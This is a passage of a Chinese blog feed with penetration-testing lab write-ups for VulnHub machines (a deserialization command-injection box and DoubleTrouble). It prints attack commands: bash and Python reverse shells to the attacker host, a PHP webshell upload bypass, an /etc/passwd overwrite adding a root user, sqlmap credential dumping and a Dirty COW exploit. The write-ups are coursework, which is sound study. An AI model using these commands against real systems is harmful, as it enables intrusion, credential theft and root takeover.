True。构造对象序列如下：</p><p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:9:&quot;127.0.0.1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p><ul><li>加入属性 <code>s:7:&quot;isValid&quot;;b:1;</code> 。</li></ul><p>其中，分析服务端代码得知，我们可以将需要注入的命令包含在 <code>ipAddress</code> 的值中，最终修改序列如下：</p><p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:14:&quot;127.0.0.1 &amp; id&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p></li><li><p>在 burp suite 中用上述注入序列替换原始的对象序列，编码后发送：</p><img src="https://assets.kekwy.com/images/image-20221125211946453.png" alt="image-20221125211946453" style="zoom:150%;" /></li><li><p>发现除了 ping 的结果，我们还收到了注入命令的执行结果：</p><img src="https://assets.kekwy.com/images/image-20221125212053362.png" alt="image-20221125212053362" style="zoom:150%;" /></li><li><p>尝试使用如下命令获取反弹 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>构造注入序列：</p><p><code>O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:40:&quot;&amp;bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1&quot;;s:7:&quot;isValid&quot;;b:1;&#125;</code></p><p>在 kali 上监听 4444 端口，执行注入命令，成功获取反弹 shell：</p><img src="https://assets.kekwy.com/images/image-20221125222124067.png" alt="image-20221125222124067" style="zoom:150%;" /></li></ol><h3 id="0x05-本地漏洞提权"><a href="#0x05-本地漏洞提权" class="headerlink" title="0x05. 本地漏洞提权"></a>0x05. 本地漏洞提权</h3><p><a id="task2"></a></p><ol><li><p>利用 <code>pspy</code> 工具检测靶机上正在运行的进程：</p><img src="https://assets.kekwy.com/images/image-20221126105419392.png" alt="image-20221126105419392" style="zoom:150%;" /><p>发现存在一个以 root 身份运行某个 shell 脚本的进程。</p><ul><li>pspy 工具：<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></li></ul></li><li><p>查看该脚本内容;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure><p>发现是将 <code>/home/rocky/public_html/*</code> 目录下的所有文件所有者更改为当前用户，猜测若在该目录下创建一个 passwd 文件的链接文件，会导致脚本执行时将 passwd 文件的所有者一并更改为当前用户，从而获取对  passwd 文件的写入权限。</p></li><li><p>使用 ln 命令将 passwd 文件链接到该目录下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd /home/rocky/public_html/111111</span><br></pre></td></tr></table></figure></li><li><p>等待片刻后查看 passwd 文件的权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br></pre></td></tr></table></figure><p><code>-rwxrwxr-x. 1 root root 1549 May 29  2021 /etc/passwd</code></p><p>发现文件权限成功被修改。</p></li><li><p>再次使用 <a href="https://blog.kekwy.com/vulnhub-evilboxone/#0x05-%E8%87%AA%E5%AE%9A%E4%B9%89-root-%E7%94%A8%E6%88%B7">实验八</a> 中自定义 root 用户的方式，插入一条 root 权限的用户记录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure></li><li><p>切换至该自定义用户，成功提权：</p><img src="https://assets.kekwy.com/images/image-20221126112046872.png" alt="image-20221126112046872" style="zoom:150%;" /></li></ol><h3 id="0x06-最终的信息收集"><a href="#0x06-最终的信息收集" class="headerlink" title="0x06. 最终的信息收集"></a>0x06. 最终的信息收集</h3><ol><li><p>尝试使用 ssh 以自定义 root 用户身份登入靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh test123@10.0.2.17</span><br></pre></td></tr></table></figure></li><li><p>成功登入后查看当前目录下的文件：</p><img src="https://assets.kekwy.com/images/image-20221126150151952.png" alt="image-20221126150151952" style="zoom:150%;" /></li><li><p>查看文件 <code>proof.txt</code> 得到 flag：<code>1aeb5db4e979543cb807cfd90df77763</code></p><img src="https://assets.kekwy.com/images/image-20221126150320630.png" alt="image-20221126150320630" style="zoom:150%;" /></li><li><p>查看文件 <code>listener.sh</code>：<br><a id="task3"></a></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -k -l 139 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 445 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 11111 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22222 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 22223 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33333 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 33334 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 44444 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55555 <span class="built_in">&amp;</span></span><br><span class="line">nc -k -l 55551</span><br></pre></td></tr></table></figure><p>发现是一段 shell 脚本，通过 nc 命令监听了很多端口。</p><p>推测这就是我们之前 nmap 扫描出来很多端口，但是无法确定其上所运行服务的原因——这些端口仅被监听，实际上并没有运行有效的服务。</p></li></ol><h2 id="五、实验结果"><a href="#五、实验结果" class="headerlink" title="五、实验结果"></a>五、实验结果</h2><p><strong>root 权限：</strong></p><img src="https://assets.kekwy.com/images/image-20221126112046872.png" alt="image-20221126112046872" style="zoom:150%;" /><ul><li>任务一：<a href="#task1">点击跳转</a>；</li><li>任务二：<a href="#task2">点击跳转</a>；</li><li>任务三：<a href="#task3">点击跳转</a>。</li></ul><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul><li>本次实验靶机开发的端口很多，需要从扫描到的端口中寻找突破口。首先关注提供 web 应用的端口。</li><li>浏览器访问 80 端口，未发现有效信息，进行路径爆破发现 <code>/blog</code> 路径，访问路径发现一个未加载样式的网页，并获得提示——靶机上存在某个服务端的备份文件。</li><li>对 <code>/blog</code> 路径进行进一步爆破，发现某些路径被重定向到了某个域名的子路径上，尝试在 kali 的 hosts 文件中将该域名与靶机 IP 绑定。再次访问 <code>/blog</code> 路径，发现成功加载了样式。</li><li>浏览器访问靶机 44441 端口，发现没有有效信息。对该端口进行域名爆破，发现一个隐藏的域名，同样将该域名与靶机 IP 进行绑定。再次访问后，发现当前页面可以对用户输入的 IP 地址进行 ping 操作。联想到命令注入。</li><li>简单尝试注入后未果，拦截 ping 操作时发往服务器的请求头。发现网页将用户输入的 IP 地址包装成了一个对象，并做了序列化操作。但由于不知道服务端解析对象的方式，故无法直接进行命令注入。</li><li>联想到 80 端口 <code>/blog</code> 路径下的提示，尝试通过路径、文件爆破寻找靶机上的备份文件。</li><li>找到备份文件后，下载至 kali 查看，推测是 ping 操作页面服务端的源码。根据该源码中的对象解析方式，构造注入对象的序列，实现合法性绕过以及命令的注入，最终成功获取反弹 shell。</li><li>使用 <code>pspy</code> 工具查看靶机上运行的进程，找到一个以 root 身份运行的 shell 脚本进程。查看相关脚本，发现该脚本将指定目录下的所有文件的所有者更改为了反弹 shell 中的当前用户。</li><li>尝试在该目录下建立 passwd 文件的链接，使该脚本更改 passwd 文件的所有者，最终获取对 passwd 文件的写入权限。</li><li>使用与实验八相同的操作自定义一条 root 用户记录，并插入 passwd 文件。</li><li>切换至自定义用户，完成提权！</li></ul><p>ps：实验报告中只展示了成功的思路，但是在实际的渗透测试中，往往需要我们对多个漏洞点进行尝试，才能找到有效的突破口。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;网络攻防实战 第十次实验&lt;/p&gt;
&lt;p&gt;邮箱：&lt;a href=&quot;mailto:&amp;#x6b;&amp;#x65;&amp;#x65;&amp;#107;&amp;#x6b;&amp;#101;&amp;#119;&amp;#x79;&amp;#64;&amp;#x71;&amp;#113;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#1</summary>
      
    
    
    
    <category term="网络攻防实战" scheme="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Kali" scheme="http://blog.kekwy.com/tags/Kali/"/>
    
    <category term="网络" scheme="http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.kekwy.com/tags/Linux/"/>
    
    <category term="vulnhub" scheme="http://blog.kekwy.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>【渗透测试】第九周 vulnhub-DoubleTrouble:1</title>
    <link href="http://blog.kekwy.com/vulnhub-doubletrouble/"/>
    <id>http://blog.kekwy.com/vulnhub-doubletrouble/</id>
    <published>2022-11-15T16:46:45.000Z</published>
    <updated>2023-12-28T08:10:44.479Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>网络攻防实战 第九次实验</p><p>邮箱：<a href="mailto:&#107;&#101;&#101;&#x6b;&#x6b;&#101;&#x77;&#121;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;">&#107;&#101;&#101;&#x6b;&#x6b;&#101;&#x77;&#121;&#64;&#113;&#x71;&#46;&#99;&#111;&#109;</a></p><p>靶机链接：<a href="https://www.vulnhub.com/entry/doubletrouble-1,743/">https://www.vulnhub.com/entry/doubletrouble-1,743/</a></p><p>2022年11月15日</p></blockquote><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>本次的靶机比较特别，在获取第一个靶机的 root 权限后会在 root 主目录下发下另一个靶机的 <code>.ova</code> 文件，我们还需要将其下载到宿主机，继续尝试渗透。最终取得两个靶机的 root 权限以及第二个靶机上的两个 flag。</p><p>我们将使用到以下攻击手段：</p><ul><li>主机发现；</li><li>端口扫描；</li><li>隐藏路径爆破；</li><li>隐写数据破解；</li><li>文件上传漏洞；</li><li>一句话木马脚本；</li><li>反弹 shell；</li><li>awk 提权；</li><li>sql基于时间的盲注（使用sqlmap）；</li><li>脏牛漏洞提权。</li></ul><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote><p>kali: 10.0.2.15</p><p>靶机: 10.0.2.14、10.0.2.16</p></blockquote><h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol><li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l</span><br><span class="line">sudo nmap -p- 10.0.2.14 -A</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115145728429.png" alt="image-20221115145728429" style="zoom:150%;" /></li><li><p>访问80端口发现是一个登录界面，查看源码也并没有直接可利用的信息：</p><img src="https://assets.kekwy.com/images/image-20221115150326673.png" alt="image-20221115150326673" style="zoom:150%;" /> </li><li><p>尝试直接输入单引号触发报错寻找注入点，也没有结果。</p><p>（使用 BurpSuite 拦截请求，发现我们输入的单引号在发送前被进行了转义，但重新修改为单引号后发送，同样没有收到报错信息）</p></li></ol><h3 id="0x01-隐藏路径爆破"><a href="#0x01-隐藏路径爆破" class="headerlink" title="0x01. 隐藏路径爆破"></a>0x01. 隐藏路径爆破</h3><ol><li><p>首先想到查找隐藏路径：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.14</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115151035467.png" alt="image-20221115151035467" style="zoom:150%;" /><p>找到了隐藏路径 <code>/secret/</code> ，根据此前实验的经验，我们第一时间查看其内容。</p></li><li><p>访问上述目录，发现只包含一张图片：</p><img src="https://assets.kekwy.com/images/image-20221115213631401.png" alt="image-20221115213631401" style="zoom:150%;" /><img src="https://assets.kekwy.com/images/image-20221115151534885.png" alt="image-20221115151534885" style="zoom:150%;" /><p>既然其处于 <code>/secret/</code> 目录下，猜测其中包含隐写入的信息。</p></li><li><p>将其保存至 kali，使用 <code>stegseek</code> 工具进行破解：</p><blockquote><p>安装：$ sudo apt install stegseek</p><p>仓库：<a href="https://github.com/RickdeJager/stegseek">https://github.com/RickdeJager/stegseek</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek doubletrouble.jpg rockyou.txt</span><br></pre></td></tr></table></figure><ul><li>其中 <code>rockyou.txt</code> 字典可以通过 <code>locate</code> 命令在 kali 上找到。</li></ul><p>生成了输出文件 <code>doubletrouble.jpg.out</code>，查看破解结果，发现疑似此前网站主页的登录邮箱和密码。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></li><li><p>尝试登录，成功跳转至下级界面：</p><img src="https://assets.kekwy.com/images/image-20221115213716058.png" alt="image-20221115213716058" style="zoom:150%;" /></li></ol><h3 id="0x02-文件上传漏洞"><a href="#0x02-文件上传漏洞" class="headerlink" title="0x02. 文件上传漏洞"></a>0x02. 文件上传漏洞</h3><ol><li><p>浏览各个界面，优先关注文件上传点：</p><ul><li><p>首先发现可以通过网页右上角进入用户的 <code>My Details</code> 界面，其中可以进行用户的头像的上传，但是先尝试上传一个普通图片后，发现该功能存在 bug，上传失败。</p><p><img src="https://assets.kekwy.com/images/image-20221115213744368.png" alt="image-20221115213744368"></p></li><li><p>返回主页后在左侧菜单栏访问目录 <code>Tools-&gt;Import Tasks from XLS file</code> ，发现第二个文件上传点，但是上传之后，同样触发错误：</p><img src="https://assets.kekwy.com/images/image-20221115213854912.png" alt="image-20221115213854912" style="zoom:150%;" /></li><li><p>最终在左侧菜单栏 <code>Configuration-&gt;General-&gt;General</code> 界面发现有效的文件上传点。</p></li></ul></li><li><p>浏览 <code>Configuration-&gt;General-&gt;General</code> 界面，发现可以进行文件上传，推测可能是用于设置该网站应用的 logo：</p><img src="https://assets.kekwy.com/images/image-20221115214057659.png" alt="image-20221115214057659" style="zoom:150%;" /></li><li><p>选择任意图片尝试上传后，发现当前页面左上角发生变化，变为了我们刚才选择的图片：</p><img src="https://assets.kekwy.com/images/image-20221115214156875.png" alt="image-20221115214156875" style="zoom:150%;" /><p>说明此处的文件上传功能确实有效可用。</p></li><li><p>尝试直接上传我们祖传的一句话木马文件，发现上传失败，推测需要进行文件类型检测的绕过。</p></li><li><p>在此尝试上传，并使用 <code>BurpSuite</code> 截获我们的请求，修改我们所上传文件的信息：</p><img src="https://assets.kekwy.com/images/image-20221115162056076.png" alt="image-20221115162056076" style="zoom:150%;" /><p>使用此前实验中用过的方法，在文件内容开头加入 <code>GIF89a</code> 进行文件内容欺诈。</p></li><li><p>发现左上角的内容发生变化，变为一张显示错误的图片。右键选择新建标签页打开图片，获取图片对应文件的 url：</p><img src="https://assets.kekwy.com/images/image-20221115213534193.png" alt="image-20221115213534193" style="zoom:150%;" /><img src="https://assets.kekwy.com/images/image-20221115213444896.png" alt="image-20221115213444896" style="zoom:150%;" /><p>显然我们的一句话木马文件上传成功，测试一下：</p><img src="https://assets.kekwy.com/images/image-20221115213349712.png" alt="image-20221115213349712" style="zoom:150%;" /></li><li><p>到此为止，我们就可以和之前一样，通过一句话木马执行反弹 shell 脚本：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.14/uploads/script.php?cmd=</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF<span class="built_in">_</span>INET,socket.SOCK<span class="built_in">_</span>STREAM);s.connect((&quot;10.0.2.15&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure></li><li><p>成功获取反弹 shell，使用以下指令进行提升：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115164716553.png" alt="image-20221115164716553" style="zoom:150%;" /></li></ol><h3 id="0x03-利用-awk-提权"><a href="#0x03-利用-awk-提权" class="headerlink" title="0x03. 利用 awk 提权"></a>0x03. 利用 awk 提权</h3><ol><li><p>查看当前用户不使用密码就可以通过 sudo 执行的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115201242366.png" alt="image-20221115201242366" style="zoom:150%;" /><p>发现可以不使用密码通过 <code>sudo</code> 执行 <code>awk</code> 命令。</p></li><li><p>前往提权指令汇总网站 <a href="https://gtfobins.github.io/">GTFOBins</a> 查找 <code>awk</code> 命令：</p><img src="https://assets.kekwy.com/images/image-20221115203414312.png" alt="image-20221115203414312" style="zoom:150%;" /><p>选择 <code>Shell</code> 查看 Shell 提权的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure></li><li><p>在反弹 shell 中输入上述指令，完成提权。</p><img src="https://assets.kekwy.com/images/image-20221115205216502.png" alt="image-20221115205216502" style="zoom:150%;" /></li><li><p>切换至靶机的 root 用户主目录，发现还存在一个靶机的  <code>.ova</code> 文件：</p><img src="https://assets.kekwy.com/images/image-20221115205358308.png" alt="image-20221115205358308" style="zoom:150%;" /></li><li><p>使用 nc 命令将其下载到 kali，再通过 virtualBox 的文件传输功能将其传送至宿主机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -n 10.0.2.15 1234 &lt; doubletrouble.ova# 靶机</span><br><span class="line">nc -lp 1234 &gt; doubletrouble.ova# kali</span><br></pre></td></tr></table></figure><ul><li>或在靶机上开启 web 应用，然后在上对目标文件进行下载【本次使用】</li></ul></li></ol><h3 id="0x04-SQL-盲注"><a href="#0x04-SQL-盲注" class="headerlink" title="0x04. SQL 盲注"></a>0x04. SQL 盲注</h3><ol><li><p>对该靶机进行同样的主机发现以及端口扫描等常规操作之后，发现开放了 80 端口，浏览器访问，发现又是一个登录界面：</p><img src="https://assets.kekwy.com/images/image-20221115214554606.png" alt="image-20221115214554606" style="zoom:150%;" /><p>常规的 SQL 注入探测未发现注入点，考虑 SQL 盲注。</p></li><li><p>截获我们在该界面进行登录时的请求：</p><img src="https://assets.kekwy.com/images/image-20221115215043041.png" alt="image-20221115215043041" style="zoom:150%;" /><p>修改如下：</p><img src="https://assets.kekwy.com/images/image-20221115215304216.png" alt="image-20221115215304216" style="zoom:150%;" /><p>根据 SQL 语法，我们可以判定，如果该报文的响应在发送十秒之后到来。则说明此处存在注入点。考虑通过 <code>sqlmap</code> 实现盲注的自动化，并导出靶机数据库。</p></li><li><p>将该请求数据包的内容拷贝至本地的文件 <code>sqlinject</code> 中：</p><img src="https://assets.kekwy.com/images/image-20221115221549809.png" alt="image-20221115221549809" style="zoom:150%;" /></li><li><p>使用 <code>sqlmap</code> 从该文件中加载请求，并进行探测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlinject -p uname,psw# 指定测试参数为uname, psw</span><br></pre></td></tr></table></figure><p><code>sqlmap</code> 会自动尝试各种注入方式，根据输入结果可知 <code>sqlmap</code> 成功通过基于时间的盲注获取靶机数据库的信息：</p><img src="https://assets.kekwy.com/images/image-20221115222758984.png" alt="image-20221115222758984" style="zoom:150%;" /></li><li><p>查看当前用户可见的数据库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlinject -p uname,psw --dbs</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115223626118.png" alt="image-20221115223626118" style="zoom:150%;" /><ul><li>由于是基于时间的盲注，观察结果的输出过程可以发现，每隔一段时间确认一个字符。</li></ul></li><li><p>查看数据库 <code>doubletrouble</code> 中的表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlinject -p uname,psw -D doubletrouble --tables</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115223959350.png" alt="image-20221115223959350" style="zoom:150%;" /></li><li><p>查看表 <code>users</code> 的列：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users --columns</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115224332430.png" alt="image-20221115224332430" style="zoom:150%;" /></li><li><p>查看表中 <code>username</code> 与 <code>password</code> 两项的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlinject -p uname,psw -D doubletrouble -T users -C username,password  --dump</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221115224953713.png" alt="image-20221115224953713" style="zoom:150%;" /><p>发现存在两个用户。</p></li><li><p>将其输入之前的登录界面，发现两个用户都无法登录。想到靶机开放了22端口，尝试使用上述两个用户的信息通过 SSH 登入靶机。发现用户 <code>clapton</code> 登入成功：</p><img src="https://assets.kekwy.com/images/image-20221115230645883.png" alt="image-20221115230645883" style="zoom:150%;" /></li></ol><h3 id="0x05-“脏牛”漏洞提权"><a href="#0x05-“脏牛”漏洞提权" class="headerlink" title="0x05. “脏牛”漏洞提权"></a>0x05. “脏牛”漏洞提权</h3><blockquote><p><strong>脏牛漏洞</strong>：又叫Dirty COW（copy-on-write），存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p><p><strong>漏洞范围</strong>：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</p></blockquote><ol><li><p>发现当前目录有存在文件 <code>user.txt</code>，查看内容，获取第一个 Flag：</p><ul><li><strong>Flag1:</strong> 6CEA7A737C7C651F6DA7669109B5FB52</li></ul></li><li><p>查看内核版本 <code>uname -a</code>：</p><img src="https://assets.kekwy.com/images/image-20221115231210037.png" alt="image-20221115231210037" style="zoom:150%;" /><p>发现该版本存在脏牛漏洞。</p></li><li><p>搜索其利用代码：</p><blockquote><p>仓库：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p></blockquote><p>在 kali 创建 <code>dcow.cpp</code> 写入漏洞利用代码，并通过 web 服务将其上传至靶机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80# kali</span><br><span class="line">wget http://10.0.2.15/dcow.cpp# 靶机</span><br></pre></td></tr></table></figure></li><li><p>查看仓库中的 <code>makefile</code> 文件，发现编译指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br></pre></td></tr></table></figure><p>在靶机上编译运行，发现该程序将靶机上 root 用户的密码强制更改为了 <code>dirtyCowFun</code>：</p><img src="https://assets.kekwy.com/images/image-20221115234056990.png" alt="image-20221115234056990" style="zoom:150%;" /></li><li><p>使用 <code>su root</code>，输入该密码切换至 root 身份：</p><img src="https://assets.kekwy.com/images/image-20221115234200279.png" alt="image-20221115234200279" style="zoom:150%;" /></li><li><p>切换至 root 用户的主目录，查看其目录下的文件，发现第二个 Flag：</p><ul><li><strong>Flag2:</strong> 1B8EEA89EA92CECB931E3CC25AA8DE21</li></ul></li></ol><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul><li><p><strong>root：</strong></p><img src="https://assets.kekwy.com/images/image-20221115234200279.png" alt="image-20221115234200279" style="zoom:150%;" /></li><li><p><strong>Flag1:</strong> 6CEA7A737C7C651F6DA7669109B5FB52</p></li><li><p><strong>Flag2:</strong> 1B8EEA89EA92CECB931E3CC25AA8DE21</p></li></ul><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul><li>访问 80 端口发现一个登录界面。爆破隐藏路径，发现 <code>/secret/</code> 路径。在其目录下发现一个图片，使用 <code>stegseek</code>  破解其中数据，猜测是用于登录主页的邮箱和密码，使用其进行登录，发现登录成功。</li><li>浏览各个界面寻找文件上传点，上传一句话木马文件，通过该文件注入反弹 shell 脚本生成反弹 shell。</li><li>使用 <code>awk</code> 提权，发现另一个靶机的 <code>.ova</code> 文件，下载至 kali 后移动到宿主机，导入 <code>Virual Box</code> 后启动。</li><li>浏览器访问 80 端口，发现登录界面。通过 <code>sqlmap</code> 进行 <code>sql</code> 注入，获取用户名和密码，通过 SSH 登入。</li><li>查看靶机内核，发现存在脏牛漏洞，搜索利用代码，上传至靶机编译运行，发现强制修改了 root 用户的密码，使用该密码即可至 root 身份，提权成功。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;网络攻防实战 第九次实验&lt;/p&gt;
&lt;p&gt;邮箱：&lt;a href=&quot;mailto:&amp;#107;&amp;#101;&amp;#101;&amp;#x6b;&amp;#x6b;&amp;#101;&amp;#x77;&amp;#121;&amp;#64;&amp;#113;&amp;#x71;&amp;#46;&amp;#99;&amp;#111;&amp;#10</summary>
      
    
    
    
    <category term="网络攻防实战" scheme="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Kali" scheme="http://blog.kekwy.com/tags/Kali/"/>
    
    <category term="网络" scheme="http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.kekwy.com/tags/Linux/"/>
    
    <category term="vulnhub" scheme="http://blog.kekwy.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>【渗透测试】第八周 vulnhub-EvilBox:One</title>
    <link href="http://blog.kekwy.com/vulnhub-EvilBoxOne/"/>
    <id>http://blog.kekwy.com/vulnhub-EvilBoxOne/</id>
    <published>2022-11-08T07:41:56.000Z</published>
    <updated>2023-12-28T08:10:50.015Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>网络攻防实战 第八次实验</p><p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#107;&#x6b;&#101;&#119;&#121;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#109;">&#x6b;&#x65;&#101;&#107;&#x6b;&#101;&#119;&#121;&#x40;&#113;&#x71;&#46;&#x63;&#111;&#109;</a></p><p>2022年11月8日</p><p>靶机链接：<a href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p></blockquote><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>取得目标靶机的 root 权限并获得两个 flag。</p><p>我们将使用到以下攻击手段：</p><ul><li>主机发现、端口扫描</li><li>隐藏路径爆破</li><li>参数名爆破</li><li>文件包含漏洞的发现以及利用</li><li>SSH 登入</li><li>私钥密码爆破</li><li>特定权限文件的发现</li><li>添加自定义用户记录</li></ul><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote><p>kali: 10.0.2.15</p><p>靶机: 10.0.2.12</p></blockquote><h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol><li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 